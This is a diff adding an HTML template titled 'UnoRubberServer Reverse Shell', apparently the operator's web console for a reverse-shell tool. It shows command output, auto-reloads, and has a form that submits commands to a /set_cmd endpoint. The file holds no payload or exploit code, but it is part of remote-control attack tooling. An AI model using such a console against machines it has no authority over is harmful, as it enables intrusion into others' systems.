@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="ISO-8859-1">
+<title>UnoRubberServer Reverse Shell</title>
+</head>
+<style>
+#footer {
+	position: fixed;
+	bottom: 8px;
+	right: 8px;
+	left: 8px;
+}
+#header {
+	position: fixed;
+	top: 8px;
+	right: 8px;
+	left: 8px;
+}
+#out_area {
+	resize: none;
+	position: fixed;
+    width: calc(100% - 24px);
+	height: calc(100% - 82px);
+	left: 8px;
+	top: 36px;
+}
+</style>
+<body onLoad="init();" onClick="resetTimer();" onKeyPress="resetTimer();">
+	<script>
+	var time = new Date().getTime();
+	function init() {
+		var textarea = document.getElementById('out_area');
+		textarea.scrollTop = textarea.scrollHeight;
+
+		setInterval(function() {
+			if (new Date().getTime() - time >= 4000) {
+				//alert("refreshing");
+				window.location.reload(true);
+			}
+		}, 1000);
+	}
+	function resetTimer() {
+		time = new Date().getTime();
+	}
+	</script>
+	<div id="header">
+		<form action="/reset">
+			<input type="SUBMIT" value="Reset" style="float: left">
+		</form>
+		<input type="SUBMIT" value="Reload" onclick="window.location.reload(true);" style="float: left">
+	</div>
+	<textarea readonly id="out_area" onscroll="resetTimer()">{{ output }}</textarea>
+	<div id="footer">
+		<form action="/set_cmd" method='get'>
+			<input type="submit" value="Send" style="float: right" />
+			<div style="overflow: hidden; padding-right: .5em;">
+			<input type="text" name="cmd" style="width: 100%;" />
+			</div>
+		</form>
+	</div>
+</body>
+</html>
